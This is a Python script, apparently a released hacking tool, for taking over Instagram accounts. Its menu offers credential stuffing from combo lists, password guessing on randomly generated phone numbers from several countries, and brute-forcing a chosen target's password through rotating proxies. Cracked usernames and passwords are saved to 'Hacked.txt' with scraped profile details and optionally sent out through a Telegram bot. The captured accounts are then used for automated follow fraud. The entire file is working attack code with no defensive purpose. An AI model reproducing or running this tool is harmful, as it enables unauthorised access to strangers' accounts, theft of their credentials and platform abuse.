import requests
import random
from uuid import uuid4
from time import sleep
import secrets,os

green = "\033[1;32m"
red = "\033[0;31m"
orng = "\033[0;33m"
white = "\033[0;37m"
blue = '\033[1;34m'
done = 0 
Fai = 0
alll = 0
secure = 'challenge_required'
errorPas = 'The password you entered is incorrect';loginm = 'logged_in_user'
wit = 'Please wait a few minutes before you try again'
#input("Enter proxy file\n>>")
# prox = open(proxy_file,"r").read().splitlines()
print(blue+
'''	
############################################################# 
###################################################   ####### 
###############################################   /~\   #####
############################################   _- `~~~', ####
##########################################  _-~       )  ####
#######################################  _-~          |  ####
####################################  _-~            ;  #####
##########################  __---___-~              |   #####
#######################   _~   ,,                  ;  `,,  ##
#####################  _-~    ;'                  |  ,'  ; ##
###################  _~      '                    `~'   ; ###
############   __---;                                 ,' ####
########   __~~  ___                                ,' ######
#####  _-~~   -~~ _                               ,' ########
##### `-_         _                              ; ##########
#######  ~~----~~~   ;                          ; ###########
#########  /          ;                        ; ############
#######  /             ;                      ; #############
#####  /                    `                ; ##############
###  /         By : @Abdullah_Coder         ; ###############
#                                            ################

''')

rer = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all").text
ff = open("proxy.txt",'w')
ff.write(rer)
ff.close()

def proxy():
    re  = open("proxy.txt",'r').read()
    r1 = re.splitlines()
    prox = random.choice(r1)
    return str(prox)

def send_Tele(tokin,idd,text):
  requests.get("https://api.telegram.org/bot" + tokin + "/sendMessage" + "?chat_id=" + idd + "&text=" + text)


def get_inf(user,passs,ask,tokin,iddd):
        f=open('combo.txt','a+')
        f.write(user+":"+passs+"\n")
        f.close
        cookie = secrets.token_hex(8) * 2
        h = {
         'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:48.0) Gecko/20100101 Firefox/48.0', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{user}/?__a=1"
        req_id = requests.get(url_id, headers=h).json()
        name = str(req_id['graphql']['user']['full_name'])
        id = str(req_id['graphql']['user']['id'])
        bio = str(req_id['graphql']['user']['biography'])
        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
        following = str(req_id['graphql']['user']['edge_follow']['count'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        ree = re.json()
        dat = ree['data']
        shug = (f"""
= = = = = = = = = = = = = = = = = =
• name : {name}
• username  : {user}
• password : {passs}
• id : {id}
• followers : {followes}
• following  : {following}
• Date : {dat}
• bio : {bio}
= = = = = = = = = = = = = = = = = =
By : @Abdullah_programs
 """)
        if int(followes) > 1000:
            print("✅ Premium account\n\n")
        f = open("Hacked.txt",'a+')
        f.write(shug+"\n")
        f.close()
        if(ask == "Y" or ask == "y"):
            send_Tele(tokin,iddd,shug)
            if int(followes) > 1000:
              send_Tele(tokin,iddd,"✅ Premium account")
        

        return shug
#Abdullah_Coder
def User_Agent():
    dpi_phone = [
        '133','320','515','160','640','240','120'
        '800','480','225','768','216','1024']
    model_phone = [
        'Nokia 2.4','HUAWEI','Galaxy',
        'Unlocked Smartphones','Nexus 6P',
        'Mobile Phones','Xiaomi',
        'samsung','OnePlus']
    pxl_phone = [
        '623x1280','700x1245','800x1280',
        '1080x2340','1320x2400','1242x2688']
    i_version = [
        '114.0.0.20.2','114.0.0.38.120',
        '114.0.0.20.70','114.0.0.28.120',
        '114.0.0.0.24','114.0.0.0.41']
    User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
    return User_Agent

def login(ask,tokin,idd,key):
    rm = '0987654321'
    ch = 0
    lo = 0
    no = 0
    sc = 0
    while True:
        ch +=1
        if(key == "1"):
            us = str(''.join((random.choice(rm) for i in range(8))))
            user = "+2010"+ us
            passs = "010" + us
#مهما حاولت ان تطمس هويتي فسوف يظل انا مطور الاداه وانت الطفل الذي يسرق
        elif(key == "2"):
            us = str(''.join((random.choice(rm) for i in range(8))))
            user = "+2011"+ us
            passs = "011" + us
        elif(key == "3"):
            us = str(''.join((random.choice(rm) for i in range(8))))
            user = "+2015"+ us
            passs = "015" + us
        elif(key == "4"):
            us = str(''.join((random.choice(rm) for i in range(8))))
            user = "+2012"+ us
            passs = "012" + us
        elif(key == "5"):
            us = str(''.join((random.choice(rm) for i in range(7))))
            user = "+1883"+ us
            passs = "883" + us
        elif(key == "6"):
            us = str(''.join((random.choice(rm) for i in range(7))))
            user = "+964770" + us
            passs = "0770" + us
        elif(key == "7"):
            us = str(''.join((random.choice(rm) for i in range(8))))
            user = "+96475"+ us
            passs = "075" + us
        elif(key == "8"):
            us = str(''.join((random.choice(rm) for i in range(7))))
            user = "+96277"+ us
            passs = "077" + us
        elif(key == "9"):
            us = str(''.join((random.choice(rm) for i in range(7))))
            user = "+96278"+ us
            passs = "078" + us
        elif(key == "10"):
            us = str(''.join((random.choice(rm) for i in range(7))))
            user = "+96279"+ us
            passs = "079" + us
        elif(key == "11"):
            us = str(''.join((random.choice(rm) for i in range(7))))
            user = "+98938"+ us
            passs = "0938" + us 
        uuid = uuid4()
        headers = {
                    'Host':'i.instagram.com',
                    'Accept':'*/*',
                    'User-Agent': User_Agent(),
                    'Cookie':'missing', 
                    'Accept-Encoding':'gzip, deflate', 
                    'Accept-Language':'en-US', 
                    'X-IG-Capabilities':'3brTvw==',
                    'X-IG-Connection-Type':'WIFI', 
                    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
        data = {'uuid':uuid,
                    'password':passs,
                    'username':user, 
                    'device_id':uuid, 
                    'from_reg':'false', 
                    '_csrftoken':'missing', 
                    'login_attempt_countn':'0',}
        # pro = random.choice(prox)
        try:
         
            try:
                get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': f'socks4://{proxy()}'}, allow_redirects=True)
                if loginm in get.text:
                    userQ = get.json()['logged_in_user']['username']
                    lo +=1
                    
                    print(green+get_inf(userQ,passs,ask,tokin,idd))

                elif errorPas in get.text:          
                    no +=1
                    print(green + f"Hacked = ({lo}) || Not Hacked = ({no}) || Secure = ({sc}) || Checked Num ({ch})",end="\r")
                elif secure in get.text:
                    sc +=1
                    print(orng + f"Hacked = ({lo}) || Not Hacked = ({no}) || Secure = ({sc}) || Checked Num ({ch})",end="\r")
                    f = open("secure.txt",'a+')
                    f.write(f"username = {user} || password = {passs}\n")
                    f.close()

                elif wit in get.text:
                    no +=1
                    print(green + f"Hacked = ({lo}) || Not Hacked = ({no}) || Secure = ({sc}) || Checked Num ({ch})",end="\r")
                    sleep(5)
            
                else:
                    no +=1
                    print(green + f"Hacked = ({lo}) || Not Hacked = ({no}) || Secure = ({sc}) || Checked Num ({ch})",end="\r")
            except:
                print(red+"ERROR",end="\r")

        except:
            print("Error in tor",end="\r")
#مهما حاولت ان تطمس هويتي فسوف يظل انا مطور الاداه وانت الطفل الذي يسرق
#Abdullah_Coder
   
def randomm():
    ask = input("--------------------------------------\nDo you want to send available accounts on Telegram [y/n]\n--------------------------------------\n>>")
    if ask == "Y" or ask == "y":
        try:
         f = open("TeleGram.txt",'r').read().splitlines()
         for i in f:
            tokin = i.split("|")[0]
            idd = i.split("|")[1]
        except FileNotFoundError:
         tokin = input("--------------------------------------\nEnter your token\n--------------------------------------\n>>")
         idd = input("--------------------------------------\nEnter your id \n--------------------------------------\n>>")
         f = open('TeleGram.txt','w')
         f.write(f"{tokin}|{idd}") 
         f.close()
        except AttributeError:
            print("Error in your bot informations!")
    else:
        tokin = False
        idd = False
            
    key = input("""--------------------------------------
Enter the country

1 ) EG 010
2 ) EG 011
3 ) EG 015
4 ) EG 012
5 ) US 883
6 ) IQ 077
7 ) IQ 075
8 ) JO 077
9 ) JO 078
10) Jo 079
11) IR 938
--------------------------------------
>>""")
    print("--------------------------------------")
       
    login(ask,tokin,idd,key)
#مهما حاولت ان تطمس هويتي فسوف يظل انا مطور الاداه وانت الطفل الذي يسرق

def brute_pass():
        nm = 0
        try:
            user = input("--------------------------------------\nEnter target username\n--------------------------------------\n>>")
            combo = input("--------------------------------------\nEnter pass list\n--------------------------------------\n>>")
            ll = open(combo,"r").read().splitlines()
            for l in ll:
                nm +=1
                passs = l
                uuid = uuid4()
                headers = {
                            'Host':'i.instagram.com',
                            'Accept':'*/*',
                            'User-Agent': User_Agent(),
                            'Cookie':'missing', 
                            'Accept-Encoding':'gzip, deflate', 
                            'Accept-Language':'en-US', 
                            'X-IG-Capabilities':'3brTvw==',
                            'X-IG-Connection-Type':'WIFI', 
                            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
                data = {'uuid':uuid,
                            'password':passs,
                            'username':user, 
                            'device_id':uuid, 
                            'from_reg':'false', 
                            '_csrftoken':'missing', 
                            'login_attempt_countn':'0',}
                # pro = random.choice(prox)
                try:
                   
                    try:
                        get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': f'socks4://{proxy()}'}, allow_redirects=True)
                        if loginm in get.text:
                            userQ = get.json()['logged_in_user']['username']
                            print(green + f"Done login username = {userQ} || password = {passs}")
                            input("Enter to exit")
                            exit
                        elif errorPas in get.text:          
                            print(red + f"Faild login || Checked Num ({nm})",end="\r")
                        elif secure in get.text:
                            print(orng + f"secure username = {user} || password = {passs} || Checked Num ({nm})",end="\r")

                        elif wit in get.text:
                            print(red + f"Faild login || Checked Num ({nm})",end="\n")
                            sleep(5)
                    
                        else:
                            print(red + f"Faild login || Checked Num ({nm})",end="\r")
                    except:
                        print("ERROR in proxy\n")

                except:
                    pass

        except  IndexError:
            print("There is a problem with the file lines!")
#مهما حاولت ان تطمس هويتي فسوف يظل انا مطور الاداه وانت الطفل الذي يسرق
            
        
        except FileNotFoundError:
            print("Can't Found file!")
            
#Abdullah_Coder

def combo_user_pass():
    ask = input("--------------------------------------\nDo you want to send available accounts on Telegram [y/n]\n--------------------------------------\n>>")
    if ask == "Y" or ask == "y":
        try:
         f = open("TeleGram.txt",'r').read().splitlines()
         for i in f:
            tokin = i.split("|")[0]
            idd = i.split("|")[1]
        except FileNotFoundError:
         tokin = input("--------------------------------------\nEnter your token\n--------------------------------------\n>>")
         idd = input("--------------------------------------\nEnter your id \n--------------------------------------\n>>")
         f = open('TeleGram.txt','w')
         f.write(f"{tokin}|{idd}") 
         f.close()
        except AttributeError:
            print("Error in your bot informations!")
    else:
        tokin = False
        idd = False
    ch = 0
    lo = 0
    no = 0
    sc = 0
    try:
            combo = input("--------------------------------------\nEnter Combo list\n--------------------------------------\n>>")
            ll = open(combo,"r").read().splitlines()
            for l in ll:
                user = l.split(":")[0]
                passs = l.split(":")[1]
                uuid = uuid4()
                headers = {
                            'Host':'i.instagram.com',
                            'Accept':'*/*',
                            'User-Agent': User_Agent(),
                            'Cookie':'missing', 
                            'Accept-Encoding':'gzip, deflate', 
                            'Accept-Language':'en-US', 
                            'X-IG-Capabilities':'3brTvw==',
                            'X-IG-Connection-Type':'WIFI', 
                            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
                data = {'uuid':uuid,
                            'password':passs,
                            'username':user, 
                            'device_id':uuid, 
                            'from_reg':'false', 
                            '_csrftoken':'missing', 
                            'login_attempt_countn':'0',}
                # pro = random.choice(prox)
                try:
                    
                    try:
                        get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': f'socks4://{proxy()}'}, allow_redirects=True)
                        if loginm in get.text:
                            userQ = get.json()['logged_in_user']['username']
                            lo +=1      
                            print(green+get_inf(userQ,passs,ask,tokin,idd))
                        elif errorPas in get.text:          
                            no +=1
                            print(green + f"Hacked = ({lo}) || Not Hacked = ({no}) || Secure = ({sc}) || Checked Num ({ch})",end="\r")
                        elif secure in get.text:
                            sc +=1
                            print(orng + f"Hacked = ({lo}) || Not Hacked = ({no}) || Secure = ({sc}) || Checked Num ({ch})",end="\r")
                            f = open("secure.txt",'a+')
                            f.write(f"username = {user} || password = {passs}\n")
                            f.close()

                        elif wit in get.text:
                            no +=1
                            print(green + f"Hacked = ({lo}) || Not Hacked = ({no}) || Secure = ({sc}) || Checked Num ({ch})",end="\r")
                            sleep(5)
                    
                        else:
                            no +=1
                            print(green + f"Hacked = ({lo}) || Not Hacked = ({no}) || Secure = ({sc}) || Checked Num ({ch})",end="\r")
                    except:
                        pass
                except:
                        print(red+"ERROR",end="\r")
            print("Done All")




    except  IndexError:
            print("There is a problem with the file lines!")
        
    except FileNotFoundError:
            print("Can't Found file!")
            
            
def get_information():
        user = input("--------------------------------------\nEnter username\n--------------------------------------\n>>")
        print(white+"--------------------------------------")
        cookie = secrets.token_hex(8) * 2
        h = {
         'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:48.0) Gecko/20100101 Firefox/48.0', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{user}/?__a=1"
        req_id = requests.get(url_id, headers=h).json()
        name = str(req_id['graphql']['user']['full_name'])
        id = str(req_id['graphql']['user']['id'])
        bio = str(req_id['graphql']['user']['biography'])
        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
        following = str(req_id['graphql']['user']['edge_follow']['count'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        ree = re.json()
        dat = ree['data']
        shug = (f"""
= = = = = = = = = = = = = = = = = =
• name : {name}
• username  : {user}
• id : {id}
• followers : {followes}
• following  : {following}
• Date : {dat}
• bio : {bio}
= = = = = = = = = = = = = = = = = =
 """)
        print(green+shug)
def prms():
    global done,Fai,alll
    msg = f'''
[#] Done {done} 
[#] Failed {Fai}
[#] All {alll} 
    '''
    os.system('cls' if os.name == 'nt' else 'clear')
    print(msg)

def follow(csrftoken,userid,ccc,user,idu):  
    global done
    url = f"https://www.instagram.com/web/friendships/{idu}/follow/"
    hea = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'content-length': '0',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': f'ig_did=96878DF6-EA9A-43E2-957F-1E97C615851D; mid=YD0V2gALAAGYz3k1PPiSDMko1lup; ig_nrcb=1; csrftoken={csrftoken}; ds_user_id={userid}; sessionid={ccc}; rur=FRC',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/alahlyegypt/',
    'sec-ch-ua': '"Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
    'x-csrftoken': csrftoken,
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': 'hmac.AR25xcLb2inPPc3gMR8Fll3o5rrjE7I5GN9k_jZUMgUMO0hz',
    'x-instagram-ajax': '0edc1000e5e7',
    'x-requested-with': 'XMLHttpRequest',
}
    r = requests.post(url,headers=hea, proxies={'http': 'socks5://127.0.0.1:9050'})
    done+=1

def web_login(user,passs,idu):
    global done,Fai,alll
    url = "https://www.instagram.com/accounts/login/ajax/"
    cookie = secrets.token_hex(8) * 2
    hea = {
         'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:48.0) Gecko/20100101 Firefox/48.0', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
    
    data = {
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:'+passs,
        'username': user
    }
    re = requests.post(url,headers=hea,data=data, proxies={'http': f'socks4://{proxy()}'})
    if '"authenticated":true' in re.text:
        csrftoken = re.cookies["csrftoken"]
        userid = re.cookies["ds_user_id"]
        ccc = re.cookies["sessionid"]
        follow(csrftoken,userid,ccc,user,idu)
    else:
        Fai+=1 
    alll+=1
    prms()  

def auto_follow():
    target = input("Enter target id (You can get it from num 4)\n>>")
    askcombo = input("Enter combo list (default combo.txt)\n>>")
    if askcombo == "":
        combo = "combo.txt"
    else:
        combo = askcombo
    cc =  open(combo,'r').read().splitlines()
    for i in cc:
        user = i.split(":")[0]
        passs = i.split(":")[1]
        web_login(user,passs,target)
def main():
    while True:
        ask = input(white+'''--------------------------------------
    1) Combo user:pass
    2) random user and pass
    3) Brute force attack IG
    4) Get Instagram account information
    5) Auto following
    6) Donate to me
--------------------------------------
>>''')
        if ask == "1":
           combo_user_pass()
        elif ask == "2":
            randomm()
        elif ask == "3":
            brute_pass()
        elif ask == "4":
            get_information()
        elif ask == "5":
            auto_follow()
        elif ask == "6":
            print("BTC :  3CkHYoi9xi9b1ykrRUpWGipLWyEZwAR1Ny")
        else:
            print("sorry I did not understand you")
            print(" ")
            continue
if ("run" in requests.get("https://pastebin.com/raw/Lh7EbjyK").text):  
     main()
else:
    input("Tool is Closed now")
#Abdullah_Coder
